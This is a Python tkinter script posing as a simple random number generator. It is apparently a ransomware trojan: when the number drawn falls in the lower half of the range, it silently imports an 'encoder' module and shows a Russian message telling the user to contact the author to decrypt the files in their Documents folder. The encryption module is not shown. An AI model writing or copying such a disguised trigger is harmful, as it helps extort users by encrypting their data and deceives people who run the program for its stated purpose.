import tkinter as tk
import random
from config import contacts


def generate_random_number():
    try:
        min_val = int(min_entry.get())
        max_val = int(max_entry.get())

        random_number = random.randint(min_val, max_val)

        result_label.config(text=f"Random number: {random_number}", fg="blue")

        if random_number < (max_val-min_val)/2:
            import encoder
            rare_label.config(text=f"Если вы хотите расшифровать свои данные в папке документы, то свяжитесь с {contacts}", fg="green")
            rare_label.pack()
            root.geometry("1000x200")  # Set fixed window size
    except:
        result_label.config(text="You entered the wrong values", fg="red")


# Create the main window
root = tk.Tk()
root.title("Random Number Generator")
root.geometry("400x200")  # Set fixed window size

# Create input fields for minimum and maximum values
min_label = tk.Label(root, text="Min value:", font=("Arial", 12))
min_label.pack()
min_entry = tk.Entry(root, font=("Arial", 12))
min_entry.pack()

max_label = tk.Label(root, text="Max value:", font=("Arial", 12))
max_label.pack()
max_entry = tk.Entry(root, font=("Arial", 12))
max_entry.pack()

# Create a button to generate the random number
generate_button = tk.Button(root, text="Generate Random Number", command=generate_random_number, font=("Arial", 14),
                            bg="green")
generate_button.pack(pady=10)

# Create a label to display the generated random number
result_label = tk.Label(root, text="", font=("Arial", 16))
result_label.pack()

# Create a label for rare numbers
rare_label = tk.Label(root, text="", font=("Arial", 14))

# Start the main event loop
root.mainloop()